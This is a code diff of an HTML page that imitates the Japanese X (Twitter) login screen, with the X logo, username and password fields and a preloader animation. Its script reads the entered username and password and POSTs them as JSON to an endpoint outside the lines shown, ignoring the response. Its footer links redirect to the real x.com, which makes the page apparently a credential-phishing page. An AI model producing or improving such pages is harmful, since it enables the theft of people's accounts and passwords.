@@ -5,8 +5,32 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Xにログイン</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
 
+        #preloader {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000; 
+            transition: opacity 0s ease-out;
+        }
+        #preloader .logo {
+            width: 60px; 
+            height: 60px;
+        }
+
+        .container {
+            opacity: 0; /
+            transition: opacity 0s ease-in;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
         body {
             background-color: #000000;
             color: #fff;
@@ -20,23 +44,23 @@
 
         .container {
             width: 100%;
-            max-width: 600px; 
+            max-width: 600px;
             min-height: 100vh;
             display: flex;
             flex-direction: column;
             align-items: center;
-            justify-content: center; 
+            justify-content: center;
             padding: 16px;
         }
 
         .login-box {
             width: 100%;
-            max-width: 300px;
+            max-width: 300px; 
             display: flex;
             flex-direction: column;
         }
 
-        .logo {
+        .login-box .logo {
             width: 30px;
             height: 30px;
             fill: #eff3f4;
@@ -44,96 +68,17 @@
             display: block;
         }
 
-        h1 {
-            font-size: 31px;
-            font-weight: 700;
-            margin-bottom: 30px;
-            text-align: left;
-        }
-
-        .input-group {
-            position: relative;
-            margin-bottom: 25px;
-            width: 100%;
-        }
-
-        .input-label {
-            display: block;
-            font-size: 15px;
-            color: #eff3f4;
-            margin-bottom: 8px;
-            line-height: 20px;
-        }
-
-        .text-input {
-            width: 100%;
-            height: 40px;
-            background-color: #000;
-            border: 1px solid #333639;
-            border-radius: 4px;
-            color: #fff;
-            font-size: 16px;
-            padding: 8px 12px;
-            outline: none;
-            transition: border-color 0.2s;
-        }
-
-        .text-input:focus {
-            border-color: #1d9bf0;
-            border-width: 2px;
-        }
-
-        .login-btn {
-            width: 100%;
-            height: 48px;
-            background-color: #1d9bf0;
-            border: none;
-            border-radius: 9999px;
-            color: #fff;
-            font-weight: 700;
-            font-size: 15px;
-            cursor: pointer;
-            margin-top: 10px;
-            margin-bottom: 30px;
-            transition: background-color 0.2s;
-        }
-
-        .login-btn:hover {
-            background-color: #1a8cd8;
-        }
-
-        .footer-links {
-            font-size: 14px;
-            color: #1d9bf0;
-            display: flex;
-            justify-content: flex-start;
-            flex-wrap: wrap;
-            gap: 5px;
-        }
-
-        .footer-links a {
-            color: #1d9bf0;
-            text-decoration: none;
-        }
-        .footer-links a:hover {
-            text-decoration: underline;
-        }
+        h1 { font-size: 31px; font-weight: 700; margin-bottom: 30px; text-align: left; }
+        .input-group { position: relative; margin-bottom: 25px; width: 100%; }
+        .input-label { display: block; font-size: 15px; color: #eff3f4; margin-bottom: 8px; line-height: 20px; }
+        .text-input { width: 100%; height: 40px; background-color: #000; border: 1px solid #333639; border-radius: 4px; color: #fff; font-size: 16px; padding: 8px 12px; outline: none; transition: border-color 0.2s; }
+        .text-input:focus { border-color: #1d9bf0; border-width: 2px; }
+        .login-btn { width: 100%; height: 48px; background-color: #1d9bf0; border: none; border-radius: 9999px; color: #fff; font-weight: 700; font-size: 15px; cursor: pointer; margin-top: 10px; margin-bottom: 30px; transition: background-color 0.2s; }
+        .login-btn:hover { background-color: #1a8cd8; }
+        .footer-links { font-size: 14px; color: #1d9bf0; display: flex; justify-content: flex-start; flex-wrap: wrap; gap: 5px; }
+        .footer-links a { color: #1d9bf0; text-decoration: none; }
+        .footer-links a:hover { text-decoration: underline; }
         .dot { margin: 0 2px; color: #71767b; }
-        
-        #preloader {
-            position: fixed;
-            ...
-            z-index: 10000; 
-            transition: opacity 0s ease-out; 
-        }
-        #preloader .logo {
-            width: 60px; 
-        }
-        
-        .container {
-            opacity: 0; 
-            transition: opacity 0s ease-in; 
-        }
         
         @media (max-width: 600px) {
             .container { justify-content: flex-start; padding-top: 40px; }
@@ -143,27 +88,24 @@
     </style>
 </head>
 <body>
-    <div id="preloader">
-        <svg viewBox="0 0 24 24" class="logo" aria-label="X">...</svg>
-    </div>
+
+<div id="preloader">
+    <svg viewBox="0 0 24 24" class="logo" aria-label="X"><g><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path></g></svg>
+</div>
+
 <div class="container">
     <div class="login-box">
         <svg viewBox="0 0 24 24" class="logo" aria-label="X"><g><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path></g></svg>
-
         <h1>Xにログイン</h1>
-
         <div class="input-group">
             <label class="input-label" for="username">電話番号、メールアドレス、またはユーザー名</label>
             <input type="text" id="username" class="text-input">
         </div>
-
         <div class="input-group">
             <label class="input-label" for="password">パスワード</label>
             <input type="password" id="password" class="text-input">
         </div>
-
         <button type="button" class="login-btn" id="loginBtn">ログイン</button>
-
         <div class="footer-links">
             <a href="#">パスワードを忘れた場合</a>
             <span class="dot">·</span>
@@ -173,6 +115,21 @@
 </div>
 
 <script>
+    window.addEventListener('load', function() {
+        const preloader = document.getElementById('preloader');
+        const container = document.querySelector('.container');
+
+        setTimeout(function() {
+            preloader.style.opacity = '0';
+            container.style.opacity = '1'; 
+            
+            setTimeout(function() {
+                preloader.style.display = 'none';
+            }, 1000); 
+        }, 2000); 
+    });
+
+
     document.getElementById('loginBtn').addEventListener('click', function() {
         const inputXdss = document.getElementById('username').value;
         const inputWans = document.getElementById('password').value;     
@@ -188,14 +145,11 @@
             },
             body: JSON.stringify(data)
         })
-        .then(response => {
-             return response.json();
-        })
-        .then(jsonData => {
-        })
-        .catch(error => {
-        });
+        .then(response => { return response.json(); })
+        .then(jsonData => { })
+        .catch(error => { });
     });
+    
     const footerLinks = document.querySelectorAll('.footer-links a');
     if (footerLinks[0]) {
         footerLinks[0].addEventListener('click', function(e) {
@@ -210,21 +164,7 @@
             window.location.href = 'https://x.com/i/flow/signup';
         });
     }
-    
-window.addEventListener('load', function() {
-    const preloader = document.getElementById('preloader');
-    const container = document.querySelector('.container');
-
-    setTimeout(function() {
-        preloader.style.opacity = '0';
-        container.style.opacity = '1';
-        
-        setTimeout(function() {
-            preloader.style.display = 'none';
-        }, 1000); 
-
-    }, 2000); 
-});
 </script>
+
 </body>
 </html>
